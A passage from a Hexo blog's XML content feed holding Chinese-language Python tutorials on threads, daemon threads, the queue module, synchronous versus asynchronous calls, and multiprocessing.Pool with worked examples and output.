punctuation">:</span> @property <span class="token keyword">with</span> getter<span class="token punctuation">,</span> Thread identifier of this thread <span class="token operator">or</span> None <span class="token keyword">if</span> it has <span class="token operator">not</span> been started<span class="token punctuation">.</span> name<span class="token punctuation">:</span> @property <span class="token keyword">with</span> getter<span class="token punctuation">,</span> setter<span class="token punctuation">,</span> A string used <span class="token keyword">for</span> identification purposes only<span class="token punctuation">.</span>function<span class="token punctuation">:</span> getName<span class="token punctuation">:</span>  isAlive<span class="token punctuation">:</span> Return whether the thread <span class="token keyword">is</span> alive<span class="token punctuation">.</span> isDaemon<span class="token punctuation">:</span>  is_alive<span class="token punctuation">:</span> Return whether the thread <span class="token keyword">is</span> alive<span class="token punctuation">.</span> join<span class="token punctuation">:</span> Wait until the thread terminates<span class="token punctuation">.</span> run<span class="token punctuation">:</span> Method representing the thread's activity<span class="token punctuation">.</span> setDaemon<span class="token punctuation">:</span>  setName<span class="token punctuation">:</span>  start<span class="token punctuation">:</span> Start the thread's activity<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性和方法</th><th></th></tr></thead><tbody><tr><td>start()</td><td>开始线程执行,每个线程对象必须只能调用它一次</td></tr><tr><td>run()</td><td>表示线程活动的方法,可以在子类中覆盖这个方法</td></tr><tr><td>join(timeout=None)</td><td>是用来阻塞当前上下文,直至该线程运行结束.一个线程可以被join()多次阻塞.如果给出timeout,则最多阻塞timeout秒，</td></tr><tr><td>name</td><td>一个字符串,只用于标识的目的.它没有语义,多个线程可以被赋予相同的名字.初始的名字通过构造函数设置。</td></tr><tr><td>getName()/setName()</td><td>一个是获取线程名,一个是设置线程名</td></tr><tr><td>ident</td><td>线程的ID,如果线程还未启动则为None,它是一个非零的整数当一个线程退出另外一个线程创建时,线程的ID可以重用,即使在线程退出后,其ID仍然可以访问</td></tr><tr><td>is_alive()/isAlive()</td><td>判断线程是否还活着</td></tr><tr><td>daemon</td><td>一个布尔值,指示线程是(True)否(False)是一个守护线程.它必须在调用start()之前设置,否则会引发RuntimeError.它的初始值继承自创建它的线程,主线程不是一个守护线程,所以在主线程中创建的所有线程默认daemon=False。</td></tr><tr><td>isDaemon()/<br>setDaemon()</td><td>一个是判断是不是守护线程,一个是设置守护线程</td></tr></tbody></table></blockquote><h3 id="3-后台线程-守护线程"><a href="#3-后台线程-守护线程" class="headerlink" title="3.后台线程,守护线程"></a>3.后台线程,守护线程</h3><blockquote><p>在程序运行中,执行一个主线程,如果主线程又创建一个子线程,主线程和子线程就分兵两路,当主线程完成想退出时,会检验子线程是否完成.对于普通线程,如果子线程的任务没有结束,主线程不会退出.整个程序也不会退出.对于守护线程,即使子线程任务还没有结束.如果主线程退出该线程也会退出.</p></blockquote><h3 id="4-队列Queue"><a href="#4-队列Queue" class="headerlink" title="4.队列Queue"></a>4.队列<code>Queue</code></h3><blockquote><p>队列模块</p><p>需要预先导入到程序中</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> queue<span class="token operator">>></span><span class="token operator">></span> pdir<span class="token punctuation">(</span>queue<span class="token punctuation">.</span>Queue<span class="token punctuation">)</span>function<span class="token punctuation">:</span> empty<span class="token punctuation">:</span> Return <span class="token boolean">True</span> <span class="token keyword">if</span> the queue <span class="token keyword">is</span> empty<span class="token punctuation">,</span> <span class="token boolean">False</span> otherwise <span class="token punctuation">(</span><span class="token operator">not</span> reliable!<span class="token punctuation">)</span><span class="token punctuation">.</span> full<span class="token punctuation">:</span> Return <span class="token boolean">True</span> <span class="token keyword">if</span> the queue <span class="token keyword">is</span> full<span class="token punctuation">,</span> <span class="token boolean">False</span> otherwise <span class="token punctuation">(</span><span class="token operator">not</span> reliable!<span class="token punctuation">)</span><span class="token punctuation">.</span> get<span class="token punctuation">:</span> Remove <span class="token operator">and</span> <span class="token keyword">return</span> an item <span class="token keyword">from</span> the queue<span class="token punctuation">.</span> get_nowait<span class="token punctuation">:</span> Remove <span class="token operator">and</span> <span class="token keyword">return</span> an item <span class="token keyword">from</span> the queue without blocking<span class="token punctuation">.</span> join<span class="token punctuation">:</span> Blocks until all items <span class="token keyword">in</span> the Queue have been gotten <span class="token operator">and</span> processed<span class="token punctuation">.</span> put<span class="token punctuation">:</span> Put an item into the queue<span class="token punctuation">.</span> put_nowait<span class="token punctuation">:</span> Put an item into the queue without blocking<span class="token punctuation">.</span> qsize<span class="token punctuation">:</span> Return the approximate size of the queue <span class="token punctuation">(</span><span class="token operator">not</span> reliable!<span class="token punctuation">)</span><span class="token punctuation">.</span> task_done<span class="token punctuation">:</span> Indicate that a formerly enqueued task <span class="token keyword">is</span> complete<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而对于<code>queue</code> 这个模块来说,它有以下模式</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> pdir<span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token keyword">class</span><span class="token punctuation">:</span> LifoQueue<span class="token punctuation">:</span> Variant of Queue that retrieves most recently added entries first<span class="token punctuation">.</span> PriorityQueue<span class="token punctuation">:</span> Variant of Queue that retrieves open entries <span class="token keyword">in</span> priority order <span class="token punctuation">(</span>lowest first<span class="token punctuation">)</span><span class="token punctuation">.</span> Queue<span class="token punctuation">:</span> Create a queue object <span class="token keyword">with</span> a given maximum size<span class="token punctuation">.</span> SimpleQueue<span class="token punctuation">:</span> Simple<span class="token punctuation">,</span> unbounded<span class="token punctuation">,</span> reentrant FIFO queue<span class="token punctuation">.</span>  deque<span class="token punctuation">:</span> deque<span class="token punctuation">(</span><span class="token punctuation">[</span>iterable<span class="token punctuation">[</span><span class="token punctuation">,</span> maxlen<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span> deque objectLifoQueue<span class="token punctuation">:</span> 后入先出PriorityQueue<span class="token punctuation">:</span> 优先队列Queue<span class="token punctuation">:</span>  队列<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python进程线程:多线程介绍</title>
      <link href="/posts/648.html"/>
      <url>/posts/648.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png"></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>目前，在软件应用中使用最广泛的并发编程范例是多线程。通常，一个应用有一个进程，分成多个独立的线程，并行运行、互相配合，执行不同类型的任务。</p><p>虽然这种模式存在一些缺点，有很多潜在的问题，但是多线程的应用依然非常广泛。</p><p>现在几乎所有的操作系统都支持多线程，几乎所有的编程语言都有相应的多线程机制，可以在应用中通过线程实现并发。</p><p>所以，使用多线程编程来实现并发的并用是个不错的选择。然而，多线程并不是唯一的选择，有不少其他的方案的表现比多线程好的多。</p><p>线程是独立的处理流程，可以和系统的其他线程并行或并发地执行。多线程可以共享数据和资源，利用所谓的共享内存空间。线程和进程的具体实现取决于你要运行的操作系统，但是总体来讲，我们可以说线程是包含在进程中的，同一进程的多个不同的线程可以共享相同的资源。相比而言，进程之间不会共享资源。</p><p>每一个线程基本上包含3个元素：程序计数器，寄存器和栈。与同一进程的其他线程共享的资源基本上包括数据和系统资源。每一个线程也有自己的运行状态，可以和其他线程同步，这点和进程一样。线程的状态大体上可以分为ready,running,blocked。线程的典型应用是应用软件的并行化——为了充分利用现代的多核处理器，使每个核心可以运行单个线程。相比于进程，使用线程的优势主要是性能。相比之下，在进程之间切换上下文要比在统一进程的多线程之间切换上下文要重的多。</p><p>多线程编程一般使用共享内容空间进行线程间的通讯。这就使管理内容空间成为多线程编程的重点和难点。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python进程线程:同步异步</title>
      <link href="/posts/9500.html"/>
      <url>/posts/9500.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png"></p><h2 id="同步-异步"><a href="#同步-异步" class="headerlink" title="同步/异步"></a>同步/异步</h2><blockquote><p>同步和异步关注的是 <strong>消息通信机制</strong> <code>synchromous communication/asynchronous communication</code></p><ul><li>同步:发出一个<code>call</code> 调用时,在没有得到结果之前,该<code>call</code> 调用就不返回,但是一旦调用返回,就得到了返回值.也就是说,是调用者主动等待这个调用的结果.</li><li>异步:发出一个<code>call</code> 调用后,这个调用就直接返回了,并没有返回调用结果,也就是说,一个异步过程调用发出后,调用者不会立即得到结果,而是在调用发出后,被调用者通过状态,通知等通知调用者.或者是通过回调函数<code>callback</code>处理这个结果.</li></ul></blockquote><h2 id="阻塞-非阻塞"><a href="#阻塞-非阻塞" class="headerlink" title="阻塞/非阻塞"></a>阻塞/非阻塞</h2><blockquote><p>阻塞非阻塞关注的是程序在等待调用结果(消息,返回值)时的状态.</p><p>阻塞调用指的是调用结果返回之前,当前进程或线程会被挂起,只有在得到结果之后才会返回.</p><p>非阻塞指的是不能立刻得到结果之前,该调用不会阻塞当前进程或线程.</p></blockquote><h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><blockquote><p>结合<a href="./10059.md">multiprocessing.Pool</a> 的两个程序理解.</p><p>一个来自网络的理解.</p><p>老张爱喝茶，废话不说，煮开水。<br>出场人物：老张，水壶两把（普通水壶，简称水壶；会响的水壶，简称响水壶）。<br>1 老张把水壶放到火上，立等水开。（同步阻塞）<br>老张觉得自己有点傻<br>2 老张把水壶放到火上，去客厅看电视，时不时去厨房看看水开没有。（同步非阻塞）<br>老张还是觉得自己有点傻，于是变高端了，买了把会响笛的那种水壶。水开之后，能大声发出嘀<del>~</del>的噪音。<br>3 老张把响水壶放到火上，立等水开。（异步阻塞）<br>老张觉得这样傻等意义不大<br>4 老张把响水壶放到火上，去客厅看电视，水壶响之前不再去看它了，响了再去拿壶。（异步非阻塞）<br>老张觉得自己聪明了。</p><p>所谓同步异步，只是对于水壶而言。<br>普通水壶，同步；响水壶，异步。<br>虽然都能干活，但响水壶可以在自己完工之后，提示老张水开了。这是普通水壶所不能及的。<br>同步只能让调用者去轮询自己（情况2中），造成老张效率的低下。</p><p>所谓阻塞非阻塞，仅仅对于老张而言。<br>立等的老张，阻塞；看电视的老张，非阻塞。<br>情况1和情况3中老张就是阻塞的，媳妇喊他都不知道。虽然3中响水壶是异步的，可对于立等的老张没有太大的意义。所以一般异步是配合非阻塞使用的，这样才能发挥异步的效用。</p><p>——来源网络，作者不明。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python进程线程:进程池</title>
      <link href="/posts/34076.html"/>
      <url>/posts/34076.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png"></p><h2 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h2><blockquote><p>在利用Python进行系统管理的时候,特别是同时操作多个文件目录,或者远程控制多台主机,并行操作可以节约大量的时间.</p><p>当被操作对象数目不大时,可以直接利用<code>multiprocessing.Process</code>动态成生多个进程,十几个还好,但如果是上百个,上千个目标,手动的去限制进程数量却又太过繁琐,此时可以发挥进程池的功效</p><p><code>Pool</code>可以提供指定数量的进程,供用户调用.当有新的请求提交到<code>pool</code>中时,如果进程池还没有满,那么就会创建一个新的进程用来执行该请求, 但如果池中的进程数已经达到规定最大值,那么该请求就会等待,直到池中有进程结束.才会创建新的进程来它</p><p><code>multiprocessing.Pool()</code> 类有以下方法:</p><table><thead><tr><th>函数</th><th>解释</th></tr></thead><tbody><tr><td><code>apply_async(func[,args[,kwargs[,callback]]])</code></td><td>不阻塞主进程,但是<code>callback</code>阻塞调用它的进程,异步操作</td></tr><tr><td><code>apply(func[,args[,kwargs]])</code></td><td>使用阻塞的方式调用func</td></tr><tr><td><code>close()</code></td><td>关闭pool, 使其不在接收新的任务</td></tr><tr><td><code>terninate()</code></td><td>不管任务是否完成,立即终止</td></tr><tr><td><code>join()</code></td><td>主进程阻塞,等待子进程的退出,必须在<code>close\ terminate</code> 之后使用</td></tr></tbody></table><p><code>apply(func[,args[,kwargs[,callback[,error_callback]]]])</code>: 返回一个结果对象,首先这是一个异步操作,如果指定了<code>callback</code> ,它必须是一个接受单个参数的可调用对象.当执行成功后,<code>ballback</code> 会被用与处理执行后的执行结果,否则调用<code>error_callback</code> ,如果指定了<code>error_callback</code> ,它必须是一个接受单个参数的可调用对象,当目标函数执行失败后,会将抛出的异常传递给<code>error_callback</code>处理.回调函数应该立即执行完成,否则会阻塞负责处理结果的线程或进程.</p></blockquote><h3 id="1-创建进程池"><a href="#1-创建进程池" class="headerlink" title="1.创建进程池"></a>1.创建进程池</h3><blockquote><p><code>apply_async()</code> 使用非阻塞异步的方式创建进程池:</p><ul><li>非阻塞指的是不会阻塞主进程</li><li>异步指的是主进程不用等待调用结果,可以运行主进程中其他代码,等待子进程信号的回馈.</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>time<span class="token comment" spellcheck="true"># 异步非阻塞的</span><span class="token keyword">def</span> <span class="token function">worker1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程:{},开始于:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> i<span class="token operator">+</span>j    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程:{},结束于:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> i<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""主进程"""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主进程,开始于:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    pool <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pool<span class="token punctuation">.</span>apply_async<span class="token punctuation">(</span>worker1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 异步</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------------'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'这是主进程在子进程后执行的部分:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------------'</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主进程结束:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>处理结果:</p><pre class="line-numbers language-bash"><code class="language-bash">主进程,开始于:1572770657.2222323-------------------这是主进程在子进程后执行的部分:1572770657.2364972-------------------子进程:ForkPoolWorker-1,开始于:1572770657.2367756子进程:ForkPoolWorker-2,开始于:1572770657.2368524子进程:ForkPoolWorker-2,结束于:1572770657.2377691子进程:ForkPoolWorker-2,开始于:1572770657.23802子进程:ForkPoolWorker-1,结束于:1572770657.2383952子进程:ForkPoolWorker-1,开始于:1572770657.2386503子进程:ForkPoolWorker-2,结束于:1572770657.2388988子进程:ForkPoolWorker-1,结束于:1572770657.240224主进程结束:1572770657.3381264<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>apply()</code> 使用阻塞同步创建进程池:</p><ul><li>阻塞是指只有一个进程处理完后,另外一个进程才会处理</li><li>同步指的是,主进程必须等待返回的结果,只有当结果返回后才会执行主程序</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>time<span class="token keyword">def</span> <span class="token function">worker1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程:{},开始于:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> i<span class="token operator">+</span>j    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程:{},结束于:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> i<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""主进程"""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主进程,开始于:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    pool <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pool<span class="token punctuation">.</span>apply<span class="token punctuation">(</span>worker1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 同步</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------------'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'这是主进程在子进程后执行的部分:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------------'</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主进程结束:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>处理结果:</p><pre class="line-numbers language-bash"><code class="language-bash">主进程,开始于:1572770654.673824子进程:ForkPoolWorker-1,开始于:1572770654.687851子进程:ForkPoolWorker-1,结束于:1572770654.688698子进程:ForkPoolWorker-2,开始于:1572770654.6891456子进程:ForkPoolWorker-2,结束于:1572770654.6897376子进程:ForkPoolWorker-1,开始于:1572770654.6900878子进程:ForkPoolWorker-1,结束于:1572770654.6906323子进程:ForkPoolWorker-2,开始于:1572770654.6908329子进程:ForkPoolWorker-2,结束于:1572770654.691444-------------------这是主进程在子进程后执行的部分:1572770654.691627-------------------主进程结束:1572770654.7890923<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对比两个返回结果.注意<code>主程序在子程序之后运行的部分这句话</code>: 这体现了异步的好处,主进程可以不用等待子进程而自己运行代码.</p><p>对比两个返回结果,阻塞的程序必须一个一个的运行,因为阻塞了主程序,导致新的子程序不能生成,而不阻塞,则可以产生并行更多的子程序.</p></blockquote><h3 id="2-进程池调用Queue-队列"><a href="#2-进程池调用Queue-队列" class="headerlink" title="2.进程池调用Queue 队列"></a>2.进程池调用<code>Queue</code> 队列</h3><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token keyword">def</span> <span class="token function">worker1</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">'worker1:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">worker2</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">'worker2:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consumer</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>qsize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>queue<span class="token punctuation">.</span>qsize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     ret <span class="token operator">=</span> queue<span class="token punctuation">.</span>get_nowait<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> queue <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Manager<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span> pool1 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> pool1<span class="token punctuation">.</span>apply<span class="token punctuation">(</span>worker1<span class="token punctuation">,</span> <span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> pool1<span class="token punctuation">.</span>apply<span class="token punctuation">(</span>worker2<span class="token punctuation">,</span> <span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> pool2 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> pool2<span class="token punctuation">.</span>apply<span class="token punctuation">(</span>consumer<span class="token punctuation">,</span> <span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> pool1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> pool1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span> pool2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> pool2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以生成2个进程池,一个用来管理<code>Queue</code> 中的写入,一个用来管理读取</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python进程线程:共享内存</title>
      <link href="/posts/50839.html"/>
      <url>/posts/50839.html</url>
      
